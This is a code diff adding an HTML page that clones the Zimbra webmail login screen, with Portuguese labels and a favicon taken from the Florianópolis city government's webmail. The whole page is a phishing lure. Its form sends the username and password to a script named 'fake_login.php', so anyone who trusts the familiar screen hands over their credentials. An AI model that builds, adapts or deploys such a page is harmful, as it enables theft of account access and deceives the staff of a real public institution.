@@ -1,0 +1,91 @@
+<!-- <?php
+    include("connection.php");
+?> -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no cliente Zimbra para Web</title>
+    <link rel="icon" type="image/x-icon" href="https://webmail.pmf.sc.gov.br/img/logo/favicon.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="center">
+        <div class="contentBox">
+            <h1><a id="bannerLink" href="http://www.zimbra.com" target="_new" title="Zimbra">
+                <span class="ImgLoginBanner"></span>
+            </a></h1>
+            <form action="fake_login.php" method="post">
+                <table class="form">
+                    <tbody>
+                        <tr>
+                            <td>
+                                <label for="userEmail">Nome do usuário:</label>
+                            </td>
+                            <td>
+                                <input type="text" name="userEmail">
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>
+                                <label for="userPassword">Senha:</label>
+                            </td>
+                            <td>
+                                <input type="password" name="userPassword">
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td></td>
+                            <td>
+                                <input type="checkbox" name="" id="">
+                                <label for="remember">Permanecer conectado</label>
+                                <input type="submit" class="ZLoginButton DwtButton" value="Login">
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td colspan="2">
+                                <hr>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td>
+                                <label for="client">Versão:</label>
+                            </td>
+                            <td>
+                                <div class="position">
+                                    <select name="" id="">
+                                        <option value="preferred" selected>Padrão</option>
+                                        <option value="advanced">Avançado (AJAX)</option>
+                                        <option value="standard">Padrão (HTML)</option>
+                                        <option value="mobile">Celular</option>
+                                    </select>
+                                    <a href="index.html" class="oque">O que é isso?</a>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="legalN">
+            <a href="https://www.zimbra.com.br" target="_new">Zimbra</a>
+            :: a líder em troca de mensagens instantâneas e colaboração usando código-fonte aberto ::
+            <a href="https://blog.zimbra.com" target="_new">Blog</a>
+             - 
+            <a href="https://wiki.zimbra.com">Wiki</a>
+             - 
+            <a href="https://www.zimbra.com/forums">Fóruns</a>
+        </div>
+        <div class="copy">
+            Copyright © 2005-2016 Synacor, Inc. Todos os direitos reservados. "Zimbra" é uma marca comercial registada da Synacor, Inc.
+        </div>
+    </div>
+</body>
+</html>
